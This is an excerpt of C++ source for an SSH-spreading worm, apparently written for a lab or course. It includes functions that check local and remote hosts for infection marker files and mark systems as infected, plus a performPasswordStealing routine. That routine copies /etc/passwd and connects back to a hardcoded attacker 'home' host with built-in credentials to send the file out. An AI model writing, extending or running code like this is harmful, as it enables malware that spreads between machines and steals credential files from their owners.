...
bool isLocalSystemInfected() {
    return ( isFileExist(SELF_MARKER_FILE) || isFileExist(PASSWORDTHIEF_MARKER_FILE));
}
...
bool isRemoteSystemInfected(ssh_session &sshClient) {
    return (isRemoteFileExist(sshClient, SELF_MARKER_FILE) ||
            isRemoteFileExist(sshClient, PASSWORDTHIEF_MARKER_FILE));
}
...
void markSystemAsInfected(const string fromHost = "") {
    ...
    // Mark the system
    markSystem(PASSWORDTHIEF_MARKER_FILE, msg);
...
/*******************************************************************************
 * Function: performPasswordStealing
 * @param host Iface struct that represent the current system IP information
 * @return 0 if success or -1 if fail
 ******************************************************************************/
int performPasswordStealing(const Iface host) {
    char sourceName[PATH_MAX] = {0};
    char destName[PATH_MAX] = {0};
    ssh_session sshHome;

    // The IP address and the credential to phone home
    const char HOME_IP[] = "192.168.1.6";
    const Credential HOME_CRED = {"ubuntu", "123456"};


    sprintf(sourceName, "/etc/passwd");
    // We set the destination to /tmp/passwd_ip
    sprintf(destName, "/tmp/passwd_%s", host.ip.c_str());

    // We are attempting to make a ssh connection back to the attacker system
    if (tryCredential(sshHome, HOME_IP, HOME_CRED) < 0) {
        perror("performPasswordStealing: failed to get session back to home\n");
        return -1;
    }
    ...
    // If we get here it means we have successfully steal the passwd file
    // Disconnect and free the sshHome session
    ssh_disconnect(sshHome);
    ssh_free(sshHome);
    return 0;
}
